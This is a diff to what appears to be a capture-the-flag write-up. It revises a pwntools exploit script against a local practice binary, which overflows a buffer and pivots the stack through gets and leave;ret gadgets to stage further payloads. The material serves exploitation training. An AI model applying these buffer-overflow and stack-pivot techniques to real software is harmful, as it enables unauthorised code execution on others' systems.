@@ -85,41 +85,94 @@ $7 = 0x40
 ````python
 from pwn import *
 
-context.binary = exe = ELF("./chall")
+libc = ELF("./libc.so.6", checksec=False)
+context.binary = exe = ELF("./chall", checksec=False)
 
 context.log_level = "debug"
 
 p = process(exe.path)
 
-gdb.attach(p, gdbscript='''
-	br *main
-	br *main+175
-	''')
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br *main
+		br *main+170
+		br *main+175
+		br *main+460
 
-p.sendline(b"1")
+		''')
+GDB()
 
-gets = 0x40125f
+high_addr = 0x404800
+gets_addr = 0x40125f
 leave_ret = 0x4011ba
-write_sec = 0x404000
-high_write_sec = 0x404800
 
-payload = b"A" * 64
-payload += p64(high_write_sec + 0x40)
-payload += p64(leave_ret)
+p.sendlineafter(b"2. Multiplayer\n", b"1")
 
-p.recvuntil(b"Enter world name:")
-p.recvline()
+payload = flat(
+	b"A" * 0x40,
+	high_addr + 0x40,
+	gets_addr
+	)
+p.recvuntil(b"Enter world name:\n")
 p.sendline(payload)
-
-payload = b"A" * 64
-payload += p64(write_sec)
-payload += p64(gets)
-p.send(payload)
-
 
 p.recvuntil(b"Creative")
 p.recvline()
-p.sendline(b"2")
+p.sendline(b"1")
+
+p.recvuntil(b"Exit")
+p.recvline()
+p.send(b"2")
+
+# gets_addr send payload
+payload = flat(
+	b"A" * 0x40, 	 #    - 0x404800
+	0x404060 + 0x40, #rbp - 0x404840
+	gets_addr,       #rip - 0x404848
+	0x404020 + 0x40, #rbp2- 0x404850
+	gets_addr        #rip2- 0x404858
+	)
+p.sendline(payload)
+
+# leave_ret to payload
+p.recvuntil(b"Creative")
+p.recvline()
+p.sendline(b"1")
+
+p.recvuntil(b"Exit")
+p.recvline()
+p.send(b"2")
+
+payload = flat(
+	# 0x404060
+	0xdeadbeef,	
+	0xcafebabe,
+	b"A" * 0x30,
+	# 0x4040a0
+	high_addr + 0x50,
+	leave_ret
+	)
+p.sendline(payload)
+
+p.recvuntil(b"Creative")
+p.recvline()
+p.sendline(b"1")
+p.recvuntil(b"Exit")
+p.recvline()
+p.send(b"2")
+
+payload = flat(
+	exe.plt.puts + 6,
+	exe.plt.puts
+	)
+p.sendline(payload)
+
+p.recvuntil(b"Creative")
+p.recvline()
+p.sendline(b"1")
+p.recvuntil(b"Exit")
+p.recvline()
+p.send(b"2")
 
 p.interactive()
 ````
